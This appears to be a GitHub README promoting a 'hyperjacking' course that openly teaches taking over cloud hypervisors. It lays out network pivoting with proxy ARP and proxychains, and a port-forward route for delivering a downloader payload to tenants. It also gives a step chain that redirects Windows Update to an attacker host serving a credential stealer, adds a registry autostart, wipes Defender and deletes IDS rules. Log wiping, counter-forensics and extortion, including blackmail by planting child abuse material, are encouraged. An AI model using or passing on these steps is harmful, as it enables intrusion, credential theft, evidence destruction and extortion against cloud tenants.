A comprehensive list of guides, handbooks, scripts, and fully featured apps required to initiate Hyper-Jacking Attacks (Theft of a Virtrual Machine)

Chang Tan
Lister Unlimited Cybersecurity Solutions, LLC.
changtan@listerunlimited.com

# The Official Lister Unlimited Cyber-Terrorism Certification Course (Cloud VPS and Virtualization Focused)

# Foreword

Unless you are physically allowed to attack a Cloud Provider. Please don't actually do it. Only do this in your own controlled environment. The act of hyperjacking should be considered a crime with a life sentence. And since this crime is **already happening right now** the moment Congress passes a act won't be too long.

This course is meant to inform the public "How bad can things get" if a 'hacker' completely controls a virtual machine Hypervisor.

And yes, someday a hyperjacker might be able to control every wireless pacemaker that was installed by a specific hospital through a infection from one of their domains and the info they may have learned from it. Think of how many lives could be at the hands of some dickhead that pwned a Amazon AWS Hypervisor years ago. And how much control over other people's lives that he has now.

# Legal

This subtopic of malicious hacking has largely been undiscussed in public circles. It should be considered a very legally sensitive "combat-form" of illegal entry into computer systems. For example, by successfully breaking into a Cloud Hypervisor that contains ANY domains or webpages that contain American owners. For each machine (quantified by webserver instances + what else you may have kicked down the doors of), you have accumulated 20 Federal charges for each machine successfully broken into, multiplied by how many connected machines are for that.

You can easily catch a charge and a sentence for a 1,000 years for this. FYI!

Furthermore, as a cybersecurity "guy", I guarantee that `that there is no guarantees that my counter-forensics tactics are actually, foolproof.` New methods and countermeasures come into the spotlight **every damn day**. But `it will DEFINITELY prolong your future cybercriminal career until the day you do get caught.`

**TLDR, make at least enough monies to retain a lawyer.**

# Update: Released unfinished book (Beginner)

Due the lack of subtopic grunt in the main repository. I have decided to release the STILL UNFINISHED Cyber Warfare Instructor Book. https://github.com/tanc7/Hyperjackers-Handbook/raw/master/lessons/CWI_%20Wireless%20Attacks%20Course%20Slides.pdf

Originally it was meant to be a supplementary textbook meant for my upcoming Udemy class but due to the time chewed up in me fending off a bunch of rabid skiddies, I am now forced to release a still yet-unfinished book composed of mostly PowerPoint slides to serve as my "force-multiplier". Quickly skimming through the pages, you'll realize that this book is strictly for beginners and many of the topics it covers may be things that you already know. The purpose of the book is meant to get newbies up to speed for ultimately, this class. 

Now I hate to repeat the same shit that I have taught before, and hence I have decided to release it.

A few changes...

1. There are no "final exams" or projects as mentioned in the book
2. The book itself was undergoing major changes on the topic of encryption, obfuscation, and tunneling prior to this war
3. There will be no certification (for now) in regards to the Cyberwarfare Instructor program, not until I pass my accounting class and have time to implement the testing and proctoring. 
4. It will come later, much later as a lot of the material requires the updating but the concepts are the same. A lot of things have indeed changed but the book itself is capable of introducing newbies in basic wireless attacks. 

The CWI course emphasized creation of a Kali Linux boot disk rather than a VM. With all consideration, you'll quickly realize that Kali Linux and Debian 9 are pretty much, exactly alike. The difference is that the Debian repository is substantially larger while Kali Linux focused primarily on penetration testing tools.

Some tools in Kali Linux are not in the official Debian repository. They can instead be obtained by downloading Katoolin and carefully performing a TEMPORARY edit of your sources.list. However, since we do not need the repo outside of a handful of tools, all of this penetration testing suite capabilities can be performed in the VM installation of Kali Linux as emphasized by this course.

There are only two reasons why you needed a bare-metal hardware installation of Kali Linux

1. Compatibility with Wi-Fi drivers. Which can be supplemented by directly utilizing KVM's PCI Pass-Through Capabilities in the Virtual Manager interface.
2. Bare-metal performance for password cracking. However, this is now finally met by KVM, and Nvidia-Docker. 

As of right now, the book totaled 250 powerpoint slides, but I saved it as a PDF for compatibility purposes so you can view it on Linux. Be aware, that the book is still unfinished and in some cases, some sections are indeed outdated.


# Tentative Curriculum

1. Steps to hyperjackings, performing the easiest Hyper-Jump. The easiest hyper-jump requires you to infect one of your Virtual Machines with another VM. And for you to merge two separate and distinct networks together.

Heres a shitty diagram...

```
Here is [my virtual network from KVM, its a  hypervisor]
Here is [your laptop]
Here is [campus wifi]


To perform this...

I create my virtual network with my Kali VM (192.168.122.20)
I connect my laptop to campus wifi (10.81.0.1) and I get my own IP of 10.81.46.54

Once I learn of the gateway with the ```route -n``` command.

I merge the REAL wireless network with my virtual network. Using two ways

1. Route or ip route commands
2. Proxy ARP which allows ethernet cards to talk to wireless cards

I then enable the virtual network Kali to have root privileges on myself, Debian + KVM. Switch a few settings that allow port-forwarding on and...

I can ping you through my Kali VM. I can then use proxychains to talk to your laptop on the Wi-Fi network through any other box or instance I owned.

Thats means I will make a proxy, and make it sound like the scan is coming from a machine that you trust so I know all of your vulnerabilities.
```

2. Network-based Hyper-Jumps. Pivoting with the Linux Route Command. Merging two networks and two physically separate network interface cards, like a Ethernet card and a Wireless Card, together in unholy matrimony using Proxy ARP Daemons.

3. Fooling your IDS. Why verbose output and SIEMs and false-positive spams are poor indicators that you are attacking someone. How to leverage this against IT.

4. Transmissible-Media Hyper-Jumps. Introduction to Disk-Imaging techniques. Creating a exact copy of a firmware update with your own malicious surprise written inside of it.

5. Forging digital signatures.

6. Covering your tracks. Which logs to wipe to cover up evidence of your access. The steps to a counter-forensics approved system shutdown script.
7. Encryption, obfuscation, and VPNs. How to defeat Deep Packet Inspection if you go to GitHub.

# What is a Hyper-Jacker?

Hyper-Jackers or "acts of Hyper-Jacking" is the deliberate theft of a virtual machine instance, commonly a massive server or array in the cloud worth billions and holds the processing power of thousands of webservers.

# The equivalent to stealing a Cloud Hypervisor is conquering a entire planet.

Yet as of this year in 2018, people are NOT AWARE of the threat of the Cloud. And yet, Hyperjackers that control at least one of these massive mainframes already exist. I am not kidding.

# What I Offer to You, the Defense Against the Dark Arts of Hyperjacking Course.

To Raise aware on the dangers of Hyperjacking and Docker Container Boosting attacks, I, Chang Tan of Lister Unlimited (dba) offer a free Hyperjacking Class on how to..

**1. Commit or perpetrate the act of Hypervisor Theft (Hyperjacking)**

, including the bare basics, your first hyper-jump, reanimating your dead shell (resurrecting yourself), persisting yourself with the stolen Hypervisor. Basically, a Hyperjacker is a much stronger form of a Cracker. Hyperjackers, if you do not deprive them of their ability to resurrect themselves, will outlast even you in your real lifespan.

**2. The scope of dangers and capabilities of a well experienced Hyperjacker**

. How to make your presence and reign of terror "immortal". How to hyper-jump on several layers, (a) the common Network Layer Hyperjump (b) the Wireless Hyper-Jump, (c) the transmissible media Hyper-Jump (d) Firmware Hyper-Jumps


**3. New abilities that set Hyperjackers a grade above malicious crackers.**

 Powers afforded to Hyper-Jackers. A stronger form of SYSTEM LEVEL ROOT. Benefits of being closer to the bare-metal and how much power it affords you compared to your victims.


# The Scope of "Absolute Power" of a Successful Hyperjacker

By now you are probably laughing at me. No more and never.

# 1. I can "push" downgrades into your online presence

if you are the unfortunate tenant of my hyperjacked hypervisor. You think you are safe because you patched yourself from SPECTRE huh? I'll take care of that. I saved the original firmware patches since Intel needed a way to allow your SkyLake virtual machine to still work if a bug borked it >:D

# 2. I can spin up my own "clone" instance to test malware

versions on which have the exact build and anti-malware versions of your instance, thanks to disk-imaging.

# 3. I can control port-forwarding rules

that allows me to attack you "from the outside" using a "outsider device" (maybe sell the rights to pwn you to some random guy on the interwebs). For example

```
I tell... [Evil Hypervisor] ---signals---> [Router Switch] to...

Forward all traffic on...

[External "Public IP"] ----Port 666----> [Routing Switch]----Forwards----> [Your Internal IP and Instance]

If...

YOUR EXTERNAL IP = 70.170.23.98:666 <----- Port I opened
YOUR VM INSTANCE IP = 172.16.84.94:22

[Some Asshole that Paid Me]----Sends Multi-Stage Downloader Payload----> 70.170.23.98:666

Then 70.170.23.98:666 ---> [Virtual Bridge] ---> 22:172.16.84.94 = OWNED

```

Basically, the Hyperjacker has bargained the rights of your online soul to.... some douchebag.

You copy?

# 4. **I can "jail" the original IT Department in a fake, virtualized instance by utilizing SELinux rules.**

Think... "The Matrix". Except Neo will never win. Or even be aware of what happened. Because I will simply "reset" his holistic journey before it happens.

What is SELinux? SELinux stands for "Security-Enhanced Linux". Unlike the AppArmor and standard Linux SYSTEM ROOT that we have on Ubuntu, Debian, and Kali installations, if Linux has replaced AppArmor with SELinux, there are "multiple-levels of 'root'".

This is meant to ensure that the attacker can maintain absolute control without being discovered.

We have not yet mentioned chroot yet, which you can do in your own home. Chroot effectively permits the user to be confined in their own jail and does not require SELinux.

# 5. I can enable online protocols that allow Linux attackers to harm you.

Windows and Linux both have had long histories of incompatible protocols that had workarounds implemented. For example...

Linux = SSH, SCP, SFTP, RSYNC

Windows = Server-Message-Block (SMB), Telnet

Both support = HTTP downloads, DNS

So if I wanted to attack a tenant, what do I do?

```
Linux can telnet so...

1. Enable Telnet protocols on you!
2. Or... install Samba on the attacker Linux instance and enable FULL ADMINISTRATOR access to the SMB shares on YOU. Because I can subvert your Windows 10's protective measures by switching the default SYSTEM possession of SMB shares over to your Administrator account.
3. Telnet into you using your own privileges, and with your privileges...
4. Remotely download OpenSSH
5. Remotely install ELEVATED POWERSHELL
6. With ELEVATED POWERSHELL, I now can execute anything I want, at the highest privileges possible (that was boosted by my other capabilities)
7. Switch your default Microsoft Windows Update Domain to... ```https://www.myevilwindowsupdatepayloads.com/pwned/netcreds.py```
8. Install Python 2.7.14 and 3.6 without you noticing
9. Wipe your malware db for Windows Defender
10. Set a registry key, on boot, auto-start "python.exe C:\Windows\System32\netcreds.py"
11. If I know you run a IDS/IPS, I will delete the rules (:

```

Maybe even have it stored at my remote Amazon AWS instance with obfs4 protecting the contents from discovery.

We already support and enable ALL of these capabilities as human-beings.

	The obfs4 pluggable transport is also known as "faster version of scramblesuit" which is itself, used by Pupy Shell, a alternative "reverse shell payload" that is FREE and can be used by YOU my friend! https://github.com/n1nj4sec/pupy
	Windows 7 to 10 still supports Telnet and Elevated Powershell via it's optional packages.
	SMB shares is already enabled as Administrator for Windows Server 2016
	Now naturally, you probably hate Windows 10 and Microsoft Auto-Forced-Updates so getting you to do this, especially since I am "your God" as the owner of the malicious hypervisor, this won't be very hard (:


# 5. But how? Can't I just take it back and steal your rights too? And become a Super Saiyan?

Precisely.

And thats the first damn thing a hyperjacker will be thinking of. They gained the status of a 'God' in whatever box they pwned. They want to keep that status.

I am certain both they and I have thought of this.

Remember, think of the net worth and scope of financial damage a hyperjacker damaged by committing this deed.
```
The original effective value of the hypervisor. A million-bajillion dollars I guess.
ADD: The collective value of all proprietary intellectual property of the KVM or Xen or ESXi hypervisor
ADD: The net worth of every web domain of every tenant that was doomed to be subjected to your tyranny.
ADD: The net worth of all proprietary trade secrets, patents, copyrights that you might find out through the hypervisor
ADD: The costs, damages incurred to get the original IT to completely eradicate your presence. Including a full hard disk wipe, overwritten with zeroes, or maybe full component replacement. Of every damn box at their datacenter. And router too (reverse shells can happen on routers thanks to routersploit and mipsle and mipsbe (little and big endian) payloads.
_____________________________________________________________________________________________________________________
EQUALS: You get what I am saying?

The quantitative value of my pwnership of your box.

```

Lets not forget. If they missed the chance to take away your persistence in ANY SINGLE router, switch, hard disk, backup storage, datacenter, usb drive.

You and I, can eventually re-pwn the hypervisor. Again and again and again! Nowadays, even MALWARE can be pushed SECURE, ENCRYPTED UPDATES.

Usually, with a even higher chance of success, because through the experience of me learning the internal routing paths of the Cloud VPS's network, I would know which box matters in getting the H.V. replaced again.


# Quick List of really messed up things that a Hyperjacker can do

1. Extort online businesses that are dependent on their website's traffic, which in turn had the misfortune of being a tenant of your stolen hypervisor.

2. Blackmail you by installing child porn on your box and calling the Feds. Or re-edit your website and take away HTTPS, which causes Google to deck your place on Search Results (it's a penalty for web design). Or add phishing pages on top of your website.

3. Usually, if hypervisors are networked to a central repository, and they usually are, we just got closer you and I, to owning the entire backup database of hypervisor images as well. Now we can never be killed off!

```Unless they physically unplug the box :(```

# Then... We're fucked.
